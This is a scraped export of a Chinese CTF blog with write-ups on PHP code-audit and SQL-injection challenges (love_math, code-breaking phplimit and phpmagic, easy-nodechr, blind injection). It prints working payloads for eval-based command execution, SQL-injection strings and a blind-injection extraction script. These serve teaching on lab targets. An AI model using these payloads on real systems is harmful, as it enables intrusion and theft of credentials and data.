数据（RFC 2397） glob:// — 查找匹配的文件路径模式 phar:// — PHP 归档 ssh2:// — Secure Shell 2 rar:// — RAR ogg:// — 音频流 expect:// — 处理交互式的流 但是有一些严格的过滤，这里有两种方法，其中绕过 1if (preg_match (&apos;/_/&apos;, $_SERVER[&apos;QUERY_STRING&apos;])) 当.或[]之类的符号作为参数的key的时候，会被php改写为_ 第一种方法： ?^.^=php://input post:(●’◡’●) 第二种方法: file_exists对于data执行内容的判断为不存在 ?^.^=data://text/plain;charset=unicode,%28%E2%97%8F%27%E2%97%A1%27%E2%97%8F%29 ======================================================================== 这是丁哥出的一道题，原题有好几步，这里只记录最后一步 1234567891011121314151617181920212223&lt;?phperror_reporting(0);if(count($_POST)&gt;0 || count($_GET)&gt;1)&#123; die(&quot;检测到木马,请勿提交非法参数&quot;);&#125;class Server&#123; public $file=&apos;myserver.php&apos;; function get_file()&#123; include_once($this-&gt;file); &#125; function __toString() &#123; $this-&gt;get_file(); &#125;&#125;$file = unserialize($_GET[&apos;file&apos;]?:&apos;&apos;);echo $file; 坑点在于 123if(count($_POST)&gt;0 || count($_GET)&gt;1)&#123; die(&quot;检测到木马,请勿提交非法参数&quot;);&#125; 原题还存在一个文件上传，但是这里不能传一句话木马，因为你会发现菜刀连接不上，因为对传入的参数个数做了限制，只能每次传一个想要执行的命令 举个栗子 1&lt;?php phpinfo();?&gt; 以后测试的时候可以先不传一句话，先用这种直接可以执行的php文件试试，防止存在类似的waf😀，想丁哥了 ========================================================================== jactf里遇到的一题 12345678910111213141516&lt;?php $str5 = (string)$_POST[&apos;str5&apos;]; $str6 = (string)$_POST[&apos;str6&apos;]; $str7 = (string)$_POST[&apos;str7&apos;]; if( $str5 == $str6 || $str6 == $str7 || $str5 == $str7)&#123; echo &quot;sorry1&quot;; &#125; else if(md5($str5) !== md5($str6) || md5($str5) !== md5($str7) || md5($str6) !== md5($str7))&#123; echo &quot;sorry2&quot;; &#125; else&#123; echo &quot;flag&#123;xxxxxxxx&#125;&quot;; &#125;?&gt; 这里是md5强碰撞，只需要利用 生产md5值相等的文件 python3 gen_coll_test.py 注意生成的txt从linux下拿到windows下文件会变化，所以需要在linux下执行最后的py脚本。 123456789101112&gt; str5=open(&apos;./WEB/python-md5-collision/md5/out_test_001.txt&apos;,&apos;r&apos;).read()&gt; &gt; str6=open(&apos;./WEB/python-md5-collision/md5/out_test_002.txt&apos;,&apos;r&apos;).read()&gt; &gt; str7=open(&apos;./WEB/python-md5-collision/md5/out_test_003.txt&apos;,&apos;r&apos;).read()&gt; &gt; data = &#123;&gt; &apos;str5&apos;:str5,&gt; &apos;str6&apos;:str6,&gt; &apos;str7&apos;:str7,&gt; &#125;&gt; 另个小题 12345678910111213141516171819$a = $_POST[&apos;a&apos;];$b = $_POST[&apos;b&apos;1];$m = $_GET[&apos;m&apos;];$n = $_GET[&apos;n&apos;];if(!(ctype_upper($a)) || !is_numeric($b) || (strlen($b)&gt;6 )) &#123; die();&#125;if((strlen($m)&gt;4) || (strlen($n)&gt;4) )&#123; die();&#125;$str8 = hash(&apos;md5&apos;, $a, false);$str9 = strtr(hash(&apos;md5&apos;, $b, $false), $m, $n);echo &quot;&lt;p&gt;str8: $str8&lt;/p&gt;&quot;;echo &quot;&lt;p&gt;str9: $str9&lt;/p&gt;&quot;;if(($str8 == $str9) &amp;&amp; !($a === $b) &amp;&amp; (strlen($b)===6 ))&#123; echo $flag;&#125; b为6位数字，a需要全大写，md5弱碰撞（0exxxxx） a可以为QNKCDZO ==&gt; 0e830400451993494058024219903391 因为hash(‘md5’, $a, false);设置了FALSE 返回小写16进制字符串 利用爆破，b可以在100000-999999间生成，但是无法保证0e后全为数字，恰好后面有一次对m的替换， 不信测试一下， 12345678for i in range(0,1000000): tmp = md5(str(i).zfill(6)) if tmp[0:2]==&apos;0e&apos;: if &apos;d&apos; not in tmp: if &apos;e&apos; not in tmp: if &apos;f&apos; not in tmp: print i break 光是def不存在就以及找不到了，还好存在一次替换，只需要将def替换成数字即可 strtr() 函数转换字符串中特定的字符。 我们需要先找到一个不存在的三个字母的数字 有个小坑，e一定要在，否则等下0e里面的e被替换了。。。😂 比如 12345678for i in range(0,1000000): tmp = md5(str(i).zfill(6)) if tmp[0:2]==&apos;0e&apos;: if &apos;a&apos; not in tmp: if &apos;e&apos; not in tmp: if &apos;f&apos; not in tmp: print i break 得到066273 =&gt; 0e82202571963256679ccc61cb17d2c8 将bcd转化为数字即可 构造 ?m=bcd&amp;n=123 post: a=QNKCDZO&amp;b=066273 ========================================================================== moctf-unset123456789101112131415161718192021222324252627282930313233&lt;?php highlight_file(&apos;index.php&apos;); function waf($a)&#123; foreach($a as $key =&gt; $value)&#123; if(preg_match(&apos;/flag/i&apos;,$key))&#123; exit(&apos;are you a hacker&apos;); &#125; &#125; &#125; foreach(array(&apos;_POST&apos;, &apos;_GET&apos;, &apos;_COOKIE&apos;) as $__R) &#123; if($$__R) &#123; foreach($$__R as $__k =&gt; $__v) &#123; if(isset($$__k) &amp;&amp; $$__k == $__v) unset($$__k); &#125; &#125; &#125; if($_POST) &#123; waf($_POST);&#125; if($_GET) &#123; waf($_GET); &#125; if($_COOKIE) &#123; waf($_COOKIE);&#125; if($_POST) extract($_POST, EXTR_SKIP); if($_GET) extract($_GET, EXTR_SKIP); if(isset($_GET[&apos;flag&apos;]))&#123; if($_GET[&apos;flag&apos;] === $_GET[&apos;daiker&apos;])&#123; exit(&apos;error&apos;); &#125; if(md5($_GET[&apos;flag&apos;] ) == md5($_GET[&apos;daiker&apos;]))&#123; include($_GET[&apos;file&apos;]); &#125; &#125;?&gt; 代码执行顺序是unset-&gt;waf-&gt;extract 构造 ?flag=QNKCDZO&amp;daiker=s878926199a&amp;file=flag.txt post: _GET[flag]=QNKCDZO&amp;_GET[daiker]=s878926199a&amp;_GET[file]=flag.txt 对于unset， 1234567891011121314151617_POST的值为，即$__Rarray (size=1) &apos;_GET&apos; =&gt; array (size=3) &apos;flag&apos; =&gt; string &apos;QNKCDZO&apos; (length=7) &apos;daiker&apos; =&gt; string &apos;s878926199a&apos; (length=11) &apos;file&apos; =&gt; string &apos;flag.txt&apos; (length=8)$__k为_GET$__v为array (size=3) &apos;flag&apos; =&gt; string &apos;QNKCDZO&apos; (length=7) &apos;daiker&apos; =&gt; string &apos;s878926199a&apos; (length=11) &apos;file&apos; =&gt; string &apos;flag.txt&apos; (length=8)$$_k为$_GET即GET传参的值$$__k == $__v成立所以 我们的超全局变量 $_GET就这么华丽丽的被unset了 绕过waf extract($_POST, EXTR_SKIP); EXTR_SKIP 如果有冲突，不覆盖已有的变量。 因为以及被unset，所以可以变量可以导入,根据顺序，这里应该用的是_POST中传的值 ========================================================================== 2019全国大学生信息安全大赛-love_math 国赛的题，当时没做出来，还是挺有意思的😀 12345678910111213141516171819202122232425262728&lt;?phperror_reporting(0);//听说你很喜欢数学，不知道你是否爱它胜过爱flagif(!isset($_GET[&apos;c&apos;]))&#123; show_source(__FILE__);&#125;else&#123; //例子 c=20-1 $content = $_GET[&apos;c&apos;]; if (strlen($content) &gt;= 80) &#123; die(&quot;太长了不会算&quot;); &#125; $blacklist = [&apos; &apos;, &apos;\\t&apos;, &apos;\\r&apos;, &apos;\\n&apos;,&apos;\\&apos;&apos;, &apos;&quot;&apos;, &apos;`&apos;, &apos;\\[&apos;, &apos;\\]&apos;]; foreach ($blacklist as $blackitem) &#123; if (preg_match(&apos;/&apos; . $blackitem . &apos;/m&apos;, $content)) &#123; die(&quot;请不要输入奇奇怪怪的字符&quot;); &#125; &#125; //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp $whitelist = [&apos;abs&apos;, &apos;acos&apos;, &apos;acosh&apos;, &apos;asin&apos;, &apos;asinh&apos;, &apos;atan2&apos;, &apos;atan&apos;, &apos;atanh&apos;, &apos;base_convert&apos;, &apos;bindec&apos;, &apos;ceil&apos;, &apos;cos&apos;, &apos;cosh&apos;, &apos;decbin&apos;, &apos;dechex&apos;, &apos;decoct&apos;, &apos;deg2rad&apos;, &apos;exp&apos;, &apos;expm1&apos;, &apos;floor&apos;, &apos;fmod&apos;, &apos;getrandmax&apos;, &apos;hexdec&apos;, &apos;hypot&apos;, &apos;is_finite&apos;, &apos;is_infinite&apos;, &apos;is_nan&apos;, &apos;lcg_value&apos;, &apos;log10&apos;, &apos;log1p&apos;, &apos;log&apos;, &apos;max&apos;, &apos;min&apos;, &apos;mt_getrandmax&apos;, &apos;mt_rand&apos;, &apos;mt_srand&apos;, &apos;octdec&apos;, &apos;pi&apos;, &apos;pow&apos;, &apos;rad2deg&apos;, &apos;rand&apos;, &apos;round&apos;, &apos;sin&apos;, &apos;sinh&apos;, &apos;sqrt&apos;, &apos;srand&apos;, &apos;tan&apos;, &apos;tanh&apos;]; preg_match_all(&apos;/[a-zA-Z_\\x7f-\\xff][a-zA-Z_0-9\\x7f-\\xff]*/&apos;, $content, $used_funcs); foreach ($used_funcs[0] as $func) &#123; if (!in_array($func, $whitelist)) &#123; die(&quot;请不要输入奇奇怪怪的函数&quot;); &#125; &#125; //帮你算出答案 eval(&apos;echo &apos;.$content.&apos;;&apos;);&#125; base_convert() 可以任意进制转换，那么我们就可以把十进制数转换为 36 进制数，这样 a~z 我们就都可以用了。 一个在线转进制的网站http://www.atool9.com/hexconvert.php 构造 payload 试试。访问 /calc.php?c=base_convert(55490343972,10,36)() 构造 1system(`ls`) base_convert(1751504350,10,36)(base_convert(784,10,36)) 但是如果要用到符号，因为不能有字母，最后需要转成10进制，字符串先转成16进制 123hexdec(bin2hex(&apos;ls *&apos;));=&gt;1819684202base_convert(37907361743,10,36)(dechex(1819484202)) 成了，那继续研究怎么绕过长度限制吧。这里的思路，就是先拿到 _GET，然后用里面的参数来作为函数的名字（这里要读文件，就是 file_get_contents 了）和参数（文件路径）了。 hex2bin()解码十六进制编码的二进制字符串。 dechex()十进制到十六进制 比如我们要_GET echo base_convert(‘hex2bin’,36,10) =&gt; 37907361743 echo hexdec(hexdec(bin2hex(‘_GET’))) =&gt; 1598506324 12345?$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi)&#123;pi&#125;(($$pi)&#123;abs&#125;)&amp;pi=system&amp;abs=tac flag.php=&gt;?$pi=hex2bin(5f474554)相当于$pi=_GET;($_GET[pi])($_GET[abs]) 这里有用到一个trick，就是使用 {} 来代替 [] 进行数组索引 https://www.php.net/manual/en/language.types.array.php#language.types.array.syntax.accessing ========================================================================== 参考链接：http://www.secevery.com:4321/bugs/wooyun-2014-063895 https://www.ctfwp.com/articals/2019national.html#lovemath https://mochazz.github.io/2019/04/22/%E7%AC%AC12%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9BWeb%E9%A2%98%E8%A7%A3/#love-math","categories":[],"tags":[{"name":"代码审计","slug":"代码审计","permalink":"http://yoursite.com/tags/代码审计/"},{"name":"ctf","slug":"ctf","permalink":"http://yoursite.com/tags/ctf/"}]},{"title":"sql-转移字符绕过","slug":"sql-转义字符绕过","date":"2019-08-16T03:11:31.000Z","updated":"2019-08-22T13:46:20.047Z","comments":true,"path":"2019/08/16/sql-转义字符绕过/","link":"","permalink":"http://yoursite.com/2019/08/16/sql-转义字符绕过/","excerpt":"另一题sql注入，记录一下😎 1&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot; /&gt;","text":"另一题sql注入，记录一下😎 1&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot; /&gt; 123456789101112131415161718192021222324252627282930&lt;?php $flag=&quot;flag&#123;hahahaha&#125;&quot;; $con = mysql_connect(&quot;localhost:3306&quot;,&quot;root&quot;,&quot;root&quot;); if (!$con)&#123; die(&apos;Could not connect: &apos; . mysql_error()); &#125; $db=&quot;cgctf&quot;; mysql_select_db($db, $con); function clean($str)&#123; if(get_magic_quotes_gpc())&#123; $str=stripslashes($str); &#125; return htmlentities($str, ENT_QUOTES); &#125; $username = @clean((string)$_GET[&apos;username&apos;]); $password = @clean((string)$_GET[&apos;password&apos;]); echo $username.&quot;&lt;br&gt;&quot;; echo $password.&quot;&lt;br&gt;&quot;; $query=&apos;SELECT * FROM users WHERE name=\\&apos;&apos;.$username.&apos;\\&apos; AND pass=\\&apos;&apos;.$password.&apos;\\&apos;;&apos;; echo $query; $result=mysql_query($query); echo $result.&quot;&lt;br&gt;&quot;; echo mysql_num_rows($result); if(!$result || mysql_num_rows($result) &lt; 1)&#123; die(&apos;Invalid password!&apos;); &#125; echo $flag;?&gt; emmm思路 stripslashes()反引用一个引用字符串。 12&gt; 返回一个去除转义反斜线后的字符串（\\&apos; 转换为 &apos; 等等）。双反斜线（\\\\）被转换为单个反斜线（\\）。&gt; Note: 如果 magic_quotes_sybase 项开启，反斜线将被去除，但是两个反斜线将会被替换成一个。 htmlentities($str, ENT_QUOTES); htmlentities — 将字符转换为 HTML 转义字符 ENT_QUOTES 既转换双引号也转换单引号。 代码中clean()函数去掉转义，htmlentities($str, ENT_QUOTES)会转换单引号和双引号。 123456function clean($str)&#123; if(get_magic_quotes_gpc())&#123; $str=stripslashes($str); &#125; return htmlentities($str, ENT_QUOTES); &#125; 结合sql语句 1SELECT * FROM users WHERE name=&apos;gg&apos; AND pass=&apos;gg&apos;; 其中gg是我填入的变量 所以直接构造 123username=\\&amp;password=or 1#==&gt;SELECT * FROM users WHERE name=&apos;\\&apos; AND pass=&apos; or 1#&apos;;","categories":[],"tags":[{"name":"sql注入","slug":"sql注入","permalink":"http://yoursite.com/tags/sql注入/"}]},{"title":"一道sql注入题","slug":"一道sql注入题","date":"2019-08-16T03:02:28.000Z","updated":"2019-08-22T13:47:16.082Z","comments":true,"path":"2019/08/16/一道sql注入题/","link":"","permalink":"http://yoursite.com/2019/08/16/一道sql注入题/","excerpt":"早上看到一题sql注入，反正没啥事，就做一下😊 1&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot; /&gt;","text":"早上看到一题sql注入，反正没啥事，就做一下😊 1&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot; /&gt; #### 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586&lt;?php include(&quot;config.php&quot;); $conn -&gt;query(&quot;set names utf8&quot;); function randStr($lenth=32)&#123; $strBase = &quot;1234567890QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm&quot;; $str = &quot;&quot;; while($lenth&gt;0)&#123; $str.=substr($strBase,rand(0,strlen($strBase)-1),1); $lenth --; &#125; return $str; &#125; if($install)&#123; $sql = &quot;create table `user` ( `id` int(10) unsigned NOT NULL PRIMARY KEY AUTO_INCREMENT , `username` varchar(30) NOT NULL, `passwd` varchar(32) NOT NULL, `role` varchar(30) NOT NULL )ENGINE=MyISAM AUTO_INCREMENT=1 DEFAULT CHARSET=latin1 COLLATE=latin1_general_ci &quot;; if($conn-&gt;query($sql))&#123; $sql = &quot;insert into `user`(`username`,`passwd`,`role`) values (&apos;admin&apos;,&apos;&quot;.md5(randStr()).&quot;&apos;,&apos;admin&apos;)&quot;; $conn -&gt; query($sql); &#125; &#125; function filter($str)&#123; $filter = &quot;/ |\\*|#|;|,|is|union|like|regexp|for|and|or|file|--|\\||`|&amp;|&quot;.urldecode(&apos;%09&apos;).&quot;|&quot;.urldecode(&quot;%0a&quot;).&quot;|&quot;.urldecode(&quot;%0b&quot;).&quot;|&quot;.urldecode(&apos;%0c&apos;).&quot;|&quot;.urldecode(&apos;%0d&apos;).&quot;|&quot;.urldecode(&apos;%a0&apos;).&quot;/i&quot;; if(preg_match($filter,$str))&#123; die(&quot;you can&apos;t input this illegal char!&quot;); &#125; return $str; &#125; function show($username)&#123; global $conn; $sql = &quot;select role from `user` where username =&apos;&quot;.$username.&quot;&apos;&quot;; $res = $conn -&gt;query($sql); if($res-&gt;num_rows&gt;0)&#123; echo &quot;$username is &quot;.$res-&gt;fetch_assoc()[&apos;role&apos;]; &#125;else&#123; die(&quot;Don&apos;t have this user!&quot;); &#125; &#125; function login($username,$passwd)&#123; global $conn; global $flag; $username = trim(strtolower($username)); $passwd = trim(strtolower($passwd)); if($username == &apos;admin&apos;)&#123; die(&quot;you can&apos;t login this as admin!&quot;); &#125; $sql = &quot;select * from `user` where username=&apos;&quot;.$conn-&gt;escape_string($username).&quot;&apos; and passwd=&apos;&quot;.$conn-&gt;escape_string($passwd).&quot;&apos;&quot;; $res = $conn -&gt;query($sql); if($res-&gt;num_rows&gt;0)&#123; if($res-&gt;fetch_assoc()[&apos;role&apos;] === &apos;admin&apos;) exit($flag); &#125;else&#123; echo &quot;sorry,username or passwd error!&quot;; &#125; &#125; function source()&#123; highlight_file(__FILE__); &#125; $username = isset($_POST[&apos;username&apos;])?filter($_POST[&apos;username&apos;]):&quot;&quot;; $passwd = isset($_POST[&apos;passwd&apos;])?filter($_POST[&apos;passwd&apos;]):&quot;&quot;; $action = isset($_GET[&apos;action&apos;])?filter($_GET[&apos;action&apos;]):&quot;source&quot;; switch($action)&#123; case &quot;source&quot;: source(); break ; case &quot;login&quot; : login($username,$passwd);break; case &quot;show&quot; : show($username);break; &#125; 1234567891011121314151617&gt; function sql_clean($str)&#123;&gt; if(is_array($str))&#123;&gt; echo &quot;&lt;script&gt; alert(&apos;not array!!@_@&apos;);parent.location.href=&apos;index.php&apos;; &lt;/script&gt;&quot;;exit;&gt; &#125;&gt; $filter = &quot;/ |\\*|#|,|union|like|regexp|for|and|or|file|--|\\||`|&amp;|&quot;.urldecode(&apos;%09&apos;).&quot;|&quot;.urldecode(&quot;%0a&quot;).&quot;|&quot;.urldecode(&quot;%0b&quot;).&quot;|&quot;.urldecode(&apos;%0c&apos;).&quot;|&quot;.urldecode(&apos;%0d&apos;).&quot;|&quot;.urldecode(&apos;%a0&apos;).&quot;/i&quot;; &gt; &gt; //由于在mysql中认为 %a0 也是空格,所以这里也需要过滤, &gt; //在这里做了修改,添加 %a0&gt; &gt; if(preg_match($filter,$str))&#123;&gt; echo &quot;&lt;script&gt; alert(&apos;illegal character!!@_@&apos;);parent.location.href=&apos;index.php&apos;; &lt;/script&gt;&quot;;exit;&gt; &#125;else if(strrpos($str,urldecode(&quot;%00&quot;)))&#123;&gt; echo &quot;&lt;script&gt; alert(&apos;illegal character!!@_@&apos;);parent.location.href=&apos;index.php&apos;; &lt;/script&gt;&quot;;exit;&gt; &#125;&gt; return $this-&gt;str=$str;&gt; &#125;&gt; 这里是过滤函数，利用bp跑一下还剩下什么 ! “” % ‘ - . / : &lt; = &gt; ? @ [] \\ ^ _ {} ~ $ () + 至于过滤%0a、a0等，是因为%0a在mysql可以代表空格 观察sql语句，需要满足返回结果大于0，并且role为admin show()，需要结果集大于0，返回第一行的role 1$sql = &quot;select role from `user` where username =&apos;&quot;.$username.&quot;&apos;&quot;; login() 1$sql = &quot;select * from `user` where username=&apos;&quot;.$conn-&gt;escape_string($username).&quot;&apos; and passwd=&apos;&quot;.$conn-&gt;escape_string($passwd).&quot;&apos;&quot;; escape_string（） 在以下字符前添加反斜杠: \\x00, \\n, \\r, , ‘, “ 和 \\x1a login()因为存在escape_string（）无法绕过单引号，只能从show入手 思路union被过滤，没有报错回显，考虑布尔盲注 mysql中的运算顺序（从下到上优先级变高） 直接构造 123select role from `user` where username =&apos;&apos;+1=&apos;0&apos;select role from `user` where username =&apos;&apos;+0=&apos;0&apos;回显不同nice 第一步，变为 where username =’1’=’0’ 第二步，变为where 0=’0’ 第三步，变为where 1 除此之外，还有 12345select role from `user` where username =&apos;&apos;^&apos;1&apos;=&apos;0&apos;select role from `user` where username =&apos;&apos;^!&apos;1&apos;=&apos;1&apos; //或者用!select role from `user` where username =&apos;&apos;-!1=&apos;1&apos;select role from `user` where username =&apos;&apos;%&apos;1&apos;=&apos;1&apos;select role from `user` where username =&apos;&apos;&lt;&apos;1&apos;=&apos;1&apos; wp里还有句题外话 select ~’18446744073709551615’; 值为0，~为取反 写个脚本，因为表的结构以及给出， 12345678910111213141516171819202122232425262728# coding=utf-8import requestsurl = &quot;http://127.0.0.1/web4/index.php?action=show&quot;flag = &quot;&quot;tmp = 0passwd = &quot;&quot;for i in range(-1,-100,-1): if tmp == 1: break tmp = 1 for j in range(33,127): payload=&apos;select(passwd)from(user)&apos; id = &quot;&apos;+(mid((&quot;+payload+&quot;)FROM(&#123;i&#125;))=&apos;&#123;flag&#125;&apos;)=&apos;0&quot;.format(i=str(i),flag=chr(j)+flag) print(id) data = &#123; &quot;username&quot;:id, &apos;passwd&apos;:&apos;1&apos; &#125; r=requests.post(url=url,data=data) #print(r.content) if &quot;admin&quot; in r.content.decode(&quot;utf-8&quot;): tmp = 0 flag=chr(j)+flag print(flag) breakprint(flag) 中间遇到个坑，for被过滤，只能用mid的from，因为不知道长度，可以利用负数判断 1234if($username == &apos;admin&apos;)&#123;if($res-&gt;fetch_assoc()[&apos;role&apos;] === &apos;admin&apos;) exit($flag); 获取flag需要从login()函数，要求传入的username不为admin，但是要求数据库获取的数据role又是admin，这里利用mysql的utf-8字符编码问题,绕过对admin的判断 以后看到下面的语句就可以联想到mysql的utf-8字符编码问题 1$conn -&gt;query(&quot;set names utf8&quot;); 只需要构造?username=admin%0c即可绕过， 造成这个Trick的根本原因是，Mysql字段的字符集和php mysqli客户端设置的字符集不相同。 参考链接：https://github.com/wonderkun/CTF_web/tree/master/web300-2 https://www.leavesongs.com/PENETRATION/mysql-charset-trick.html","categories":[],"tags":[{"name":"sql注入","slug":"sql注入","permalink":"http://yoursite.com/tags/sql注入/"}]},{"title":"codebreaking-5","slug":"codebreaking-5","date":"2019-08-15T01:00:44.000Z","updated":"2019-08-22T13:46:36.691Z","comments":true,"path":"2019/08/15/codebreaking-5/","link":"","permalink":"http://yoursite.com/2019/08/15/codebreaking-5/","excerpt":"还有半小时，再刷亿题😀 1&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot; /&gt;","text":"还有半小时，再刷亿题😀 1&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot; /&gt; easy-nodechr 本地windows搭建环境 12&gt; node index.js&gt; Error: Cannot find module ‘koa’ 12&gt; npm install koa&gt; ====== 安装了很多module 依赖全部安装成功后还是启动不了，用docker启动 12&gt; docker-compose up -d --build&gt; 123456789101112131415161718192021222324252627282930function safeKeyword(keyword) &#123; if(isString(keyword) &amp;&amp; !keyword.match(/(union|select|;|\\-\\-)/is)) &#123; return keyword &#125; return undefined&#125;async function login(ctx, next) &#123; if(ctx.method == &apos;POST&apos;) &#123; let username = safeKeyword(ctx.request.body[&apos;username&apos;]) let password = safeKeyword(ctx.request.body[&apos;password&apos;]) let jump = ctx.router.url(&apos;login&apos;) if (username &amp;&amp; password) &#123; let user = await ctx.db.get(`SELECT * FROM &quot;users&quot; WHERE &quot;username&quot; = &apos;$&#123;username.toUpperCase()&#125;&apos; AND &quot;password&quot; = &apos;$&#123;password.toUpperCase()&#125;&apos;`) if (user) &#123; ctx.session.user = user jump = ctx.router.url(&apos;admin&apos;) &#125; &#125; ctx.status = 303 ctx.redirect(jump) &#125; else &#123; await ctx.render(&apos;index&apos;) &#125;&#125; 万能密码尝试 1230&apos;or &apos;1&apos;=&apos;10&apos;or &apos;1&apos;=&apos;1但是进去之后没啥东西，需要暴库 思路是利用toUpperCase（），这两个字符的“大写”是I和S。也就是说”ı”.toUpperCase() == ‘I’，”ſ”.toUpperCase() == ‘S’。通过这个小特性可以绕过一些限制。 这个”K”的“小写”字符是k，也就是”K”.toLowerCase() == ‘k’. 所以可以构造payload绕过waf： 1SELECT * FROM &quot;users&quot; WHERE &quot;username&quot; = &apos;0&apos; AND &quot;password&quot; = &apos;0&apos; union select 1,2 where &apos;1&apos;=&apos;1&apos; username: 0 password: 0’ unıon ſelect 1,flag,3 where ‘1’=’1 但是我可能环境还是有问题，返回Internal Server Error 下面是console的测试 后面的题目过几天再做把，慢就是快 ━┳━ ━┳━ 参考链接：http://f1sh.site/2018/11/25/code-breaking-puzzles%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/ https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html","categories":[],"tags":[{"name":"代码审计","slug":"代码审计","permalink":"http://yoursite.com/tags/代码审计/"},{"name":"codebreaking","slug":"codebreaking","permalink":"http://yoursite.com/tags/codebreaking/"}]},{"title":"codebreaking-4","slug":"codebreaking-4","date":"2019-08-14T23:16:56.000Z","updated":"2019-08-22T13:46:44.042Z","comments":true,"path":"2019/08/15/codebreaking-4/","link":"","permalink":"http://yoursite.com/2019/08/15/codebreaking-4/","excerpt":"新的一天，再做几题，等下9：30开始做ichunqiu上的网络与信息安全领域专项赛，希望大佬们带我飞😘 1&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot; /&gt;","text":"新的一天，再做几题，等下9：30开始做ichunqiu上的网络与信息安全领域专项赛，希望大佬们带我飞😘 1&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot; /&gt; easy - phplimit123456&lt;?php if(&apos;;&apos; === preg_replace(&apos;/[^\\W]+\\((?R)?\\)/&apos;, &apos;&apos;, $_GET[&apos;code&apos;])) &#123; eval($_GET[&apos;code&apos;]); &#125; else &#123; show_source(__FILE__); &#125; 首先搭建环境，是nginx，先用phpstudy的nginx搭建试试，不行再用linux虚拟机(￣▽￣)” 原题是rctf的r-cursive，两题的意思都是只能传入函数，黁那个c (?R)是引用当前表达式的意思，即可以用\\w+((?R)?)替换到(?R)的位置，因此可以衍生成匹配\\w+(\\w+((?R)?))、\\w+(\\w+(\\w+((?R)?)))、…(?R)? 这里多一个?表示可以有引用，也可以没有。 原理是利用php的getallheaders()，我们可以通过设置ua来传入字符串，成功执行我想要的命令。这里我们先看看phpinfo的内容。 payload： ?code=eval(implode(array_reverse(getallheaders()))); 在headers的Host上面一行添加 1: phpinfo();// 需要的注意的是getallheaders()好像是默认是逆序的，我加了var_dump()查看 ok，本题思路类似，但是nginx 我试了试上面的payload，居然也可以？？？？😢 本来getallheaders()是apache模块的函数，可能是phpstudy的nginx环境问题，我没有对nginx进行配置。 假装这是不行的，寻找nginx中能代替getallheaders()的函数 get_defined_vars()返回所有已定义变量所组成的数组，这个已定义的变量里就包括了$_GET、$_POST等我们可以控制的变量，所以把要执行的代码写在其他的get参数里即可 构造payload： ?aa=phpinfo();//&amp;code=eval(implode(reset(get_defined_vars()))); 附上另一个大师傅的payload： 1?code=readfile(next(array_reverse(scandir(dirname(chdir(dirname(getcwd()))))))); d=====(￣▽￣*)b 参考链接：https://lorexxar11.cn/2018/05/23/rctf2018/ http://f1sh.site/2018/11/25/code-breaking-puzzles%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/","categories":[],"tags":[{"name":"代码审计","slug":"代码审计","permalink":"http://yoursite.com/tags/代码审计/"},{"name":"codebreaking","slug":"codebreaking","permalink":"http://yoursite.com/tags/codebreaking/"}]},{"title":"codebreaking-3","slug":"codebreaking-3","date":"2019-08-14T07:35:35.000Z","updated":"2019-08-22T13:46:51.659Z","comments":true,"path":"2019/08/14/codebreaking-3/","link":"","permalink":"http://yoursite.com/2019/08/14/codebreaking-3/","excerpt":"第三题lei啦拉拉 easy - phpmagic1&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot; /&gt;","text":"第三题lei啦拉拉 easy - phpmagic1&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot; /&gt; 12345678910111213141516171819202122232425262728&lt;?php if(isset($_GET[&apos;read-source&apos;])) &#123; exit(show_source(__FILE__)); &#125; define(&apos;DATA_DIR&apos;, dirname(__FILE__) . &apos;/data/&apos; . md5($_SERVER[&apos;REMOTE_ADDR&apos;])); if(!is_dir(DATA_DIR)) &#123; mkdir(DATA_DIR, 0755, true); &#125; chdir(DATA_DIR); $domain = isset($_POST[&apos;domain&apos;]) ? $_POST[&apos;domain&apos;] : &apos;&apos;; $log_name = isset($_POST[&apos;log&apos;]) ? $_POST[&apos;log&apos;] : date(&apos;-Y-m-d&apos;); if(!empty($_POST) &amp;&amp; $domain): $command = sprintf(&quot;dig -t A -q %s&quot;, escapeshellarg($domain)); $output = shell_exec($command); $output = htmlspecialchars($output, ENT_HTML401 | ENT_QUOTES); $log_name = $_SERVER[&apos;SERVER_NAME&apos;] . $log_name; if(!in_array(pathinfo($log_name, PATHINFO_EXTENSION), [&apos;php&apos;, &apos;php3&apos;, &apos;php4&apos;, &apos;php5&apos;, &apos;phtml&apos;, &apos;pht&apos;], true)) &#123; file_put_contents($log_name, $output); &#125; echo $output; endif; ?&gt; escapeshellarg()把字符串转码为可以在 shell 命令里使用的参数，将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。 htmlspecialchars()将特殊字符转换为 HTML 实体 而一句话木马需要&lt; 首先第一步，解决&lt;被转义的问题 file_put_contents($log_name, $output); 在file_put_contents()中，$log_name可以设置读取文件内容解码，那么只需要将文件内容base64编码即可 测试发现： 需要把服务器部署到linux上，因为windows中没有dig这个命令😔 $log_name是取自http头中的host 而$output中有一部分内容是domain 第二步，解决文件后缀的问题 只要在后缀名后加上/. pathinfo就取不到后缀名，且可以正常写入.php之中。具体原理可以参考链接😀，php在处理路径的时候，会递归的删除掉路径中存在的/. 解码中遇到不符合规范的字符直接跳过。所以虽然我们只能控制一部分内容，但是其他内容并不影响base64解码。另外因为base64解码是4位4位的解的，所以我们要保证我们需要解码的字符串之前的合法字符数为4的倍数，字符范围是A—Z，a—z，0—9，+，/ 测试： 搜集刚才的xxx得到的结果（注意去掉符号）为 